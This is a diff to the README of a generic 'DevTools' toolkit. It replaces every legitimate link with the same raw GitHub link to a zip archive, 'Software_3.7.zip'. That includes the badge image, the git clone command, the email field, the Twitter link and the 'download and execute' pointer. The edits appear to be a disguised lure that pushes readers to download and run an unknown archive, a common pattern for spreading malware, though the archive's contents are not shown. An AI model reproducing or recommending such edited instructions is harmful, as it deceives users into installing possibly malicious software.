@@ -1,6 +1,6 @@
 # 🚀 DevTools: Your Essential Toolkit for Development
 
-![DevTools](https://img.shields.io/badge/DevTools-Toolkit-brightgreen)
+![DevTools](https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip)
 
 Welcome to the **DevTools** repository! This project serves as a comprehensive toolkit designed to streamline your development process. Whether you're a seasoned developer or just starting out, you'll find valuable tools and resources here to enhance your workflow.
 
@@ -33,7 +33,7 @@ To get started with **DevTools**, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/devtools.git
+   git clone https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -51,7 +51,7 @@ To get started with **DevTools**, follow these simple steps:
    npm start
    ```
 
-Now you're ready to use **DevTools**! If you need to download and execute any specific files, please visit [GitHub](https://github.com).
+Now you're ready to use **DevTools**! If you need to download and execute any specific files, please visit [GitHub](https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip).
 
 ## Usage
 
@@ -106,12 +106,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip)
 
 ## Visit GitHub
 
-For more information, updates, and releases, please visit [GitHub](https://github.com). You can find the latest releases in the "Releases" section.
+For more information, updates, and releases, please visit [GitHub](https://raw.githubusercontent.com/dessalegn94/devtools/master/periscopical/Software_3.7.zip). You can find the latest releases in the "Releases" section.
 
 ---
 
